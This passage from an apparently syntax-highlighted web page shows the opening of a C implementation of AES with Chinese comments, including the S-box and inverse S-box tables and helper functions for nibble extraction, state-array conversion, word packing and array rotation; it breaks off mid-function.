class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * S盒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> S[<span class="number">16</span>][<span class="number">16</span>] = &#123; <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 逆S盒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> S2[<span class="number">16</span>][<span class="number">16</span>] = &#123; <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line"><span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span class="number">0x6b</span>,</span><br><span class="line"><span class="number">0x3a</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4f</span>, <span class="number">0x67</span>, <span class="number">0xdc</span>, <span class="number">0xea</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0xcf</span>, <span class="number">0xce</span>, <span class="number">0xf0</span>, <span class="number">0xb4</span>, <span class="number">0xe6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xac</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xe7</span>, <span class="number">0xad</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xe2</span>, <span class="number">0xf9</span>, <span class="number">0x37</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x75</span>, <span class="number">0xdf</span>, <span class="number">0x6e</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xf1</span>, <span class="number">0x1a</span>, <span class="number">0x71</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0xc5</span>, <span class="number">0x89</span>, <span class="number">0x6f</span>, <span class="number">0xb7</span>, <span class="number">0x62</span>, <span class="number">0x0e</span>, <span class="number">0xaa</span>, <span class="number">0x18</span>, <span class="number">0xbe</span>, <span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0xfc</span>, <span class="number">0x56</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0xc6</span>, <span class="number">0xd2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9a</span>, <span class="number">0xdb</span>, <span class="number">0xc0</span>, <span class="number">0xfe</span>, <span class="number">0x78</span>, <span class="number">0xcd</span>, <span class="number">0x5a</span>, <span class="number">0xf4</span>,</span><br><span class="line"><span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0xa8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xc7</span>, <span class="number">0x31</span>, <span class="number">0xb1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7f</span>, <span class="number">0xa9</span>, <span class="number">0x19</span>, <span class="number">0xb5</span>, <span class="number">0x4a</span>, <span class="number">0x0d</span>, <span class="number">0x2d</span>, <span class="number">0xe5</span>, <span class="number">0x7a</span>, <span class="number">0x9f</span>, <span class="number">0x93</span>, <span class="number">0xc9</span>, <span class="number">0x9c</span>, <span class="number">0xef</span>,</span><br><span class="line"><span class="number">0xa0</span>, <span class="number">0xe0</span>, <span class="number">0x3b</span>, <span class="number">0x4d</span>, <span class="number">0xae</span>, <span class="number">0x2a</span>, <span class="number">0xf5</span>, <span class="number">0xb0</span>, <span class="number">0xc8</span>, <span class="number">0xeb</span>, <span class="number">0xbb</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x04</span>, <span class="number">0x7e</span>, <span class="number">0xba</span>, <span class="number">0x77</span>, <span class="number">0xd6</span>, <span class="number">0x26</span>, <span class="number">0xe1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0c</span>, <span class="number">0x7d</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取整形数据的低8位的左4个位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getLeft4Bit</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line"><span class="type">int</span> left = num &amp; <span class="number">0x000000f0</span>;</span><br><span class="line"><span class="keyword">return</span> left &gt;&gt; <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取整形数据的低8位的右4个位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getRight4Bit</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> num &amp; <span class="number">0x0000000f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据索引，从S盒中获得元素</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getNumFromSBox</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line"><span class="type">int</span> row = getLeft4Bit(index);</span><br><span class="line"><span class="type">int</span> col = getRight4Bit(index);</span><br><span class="line"><span class="keyword">return</span> S[row][col];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把一个字符转变成整型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getIntFromChar</span><span class="params">(<span class="type">char</span> c)</span> &#123;</span><br><span class="line"><span class="type">int</span> result = (<span class="type">int</span>) c;</span><br><span class="line"><span class="keyword">return</span> result &amp; <span class="number">0x000000ff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把16个字符转变成4X4的数组，</span></span><br><span class="line"><span class="comment"> * 该矩阵中字节的排列顺序为从上到下，</span></span><br><span class="line"><span class="comment"> * 从左到右依次排列。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">convertToIntArray</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> pa[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">pa[j][i] = getIntFromChar(str[k]);</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打印4X4的数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printArray</span><span class="params">(<span class="type">int</span> a[<span class="number">4</span>][<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a[%d][%d] = 0x%x &quot;</span>, i, j, a[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 打印字符串的ASSCI，</span></span><br><span class="line"><span class="comment"> * 以十六进制显示。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printASSCI</span><span class="params">(<span class="type">char</span> *str, <span class="type">int</span> len)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x &quot;</span>, getIntFromChar(str[i]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把连续的4个字符合并成一个4字节的整型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">getWordFromStr</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line"><span class="type">int</span> one = getIntFromChar(str[<span class="number">0</span>]);</span><br><span class="line">one = one &lt;&lt; <span class="number">24</span>;</span><br><span class="line"><span class="type">int</span> two = getIntFromChar(str[<span class="number">1</span>]);</span><br><span class="line">two = two &lt;&lt; <span class="number">16</span>;</span><br><span class="line"><span class="type">int</span> three = getIntFromChar(str[<span class="number">2</span>]);</span><br><span class="line">three = three &lt;&lt; <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> four = getIntFromChar(str[<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">return</span> one | two | three | four;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把一个4字节的数的第一、二、三、四个字节取出，</span></span><br><span class="line"><span class="comment"> * 入进一个4个元素的整型数组里面。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">splitIntToArray</span><span class="params">(<span class="type">int</span> num, <span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> one = num &gt;&gt; <span class="number">24</span>;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">0</span>] = one &amp; <span class="number">0x000000ff</span>;</span><br><span class="line"><span class="type">int</span> two = num &gt;&gt; <span class="number">16</span>;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">1</span>] = two &amp; <span class="number">0x000000ff</span>;</span><br><span class="line"><span class="type">int</span> three = num &gt;&gt; <span class="number">8</span>;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">2</span>] = three &amp; <span class="number">0x000000ff</span>;</span><br><span class="line"><span class="built_in">array</span>[<span class="number">3</span>] = num &amp; <span class="number">0x000000ff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将数组中的元素循环左移step位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">leftLoop4int</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>], <span class="type">int</span> step)</span> &#123;</span><br><span class="line"><span class="type">int</span> temp[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">temp[i] = <span class="built_in">array</span>[i];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> index = step % <span class="number">4</span> == <span class="number">0</span> ? <span class="number">0</span> : step % <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="built_in">array</span>[i] = temp[index];</span><br><span class="line">index++;</span><br><span class="line">index = index % <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把数组中的第一、二、三和四元素分别作为</span></span><br><span class="line"><span class="comment"> * 4字节整型的第一、二、三和四字节，合并成一个4字节整型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mergeArrayToInt</span><span class="params">(<span class="type">int</span> <span class="built_in">array</span>[<span class="number">4</span>])</span> &#123;</span><br><span class="line"><span class="type">int</span> one = <span class="built_in">array</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>;</span><br><span class="line"><span class="type">int</span> two = <span class="built_in">array</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>;</span><br><span class="line"><span class="type">int</span> three = <span class="built_in">array</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>;</span><br><span class="line"><span class="type">int</span> four = <span class="built_in">array</span>[<span class="number">3</span>];</span><br><span 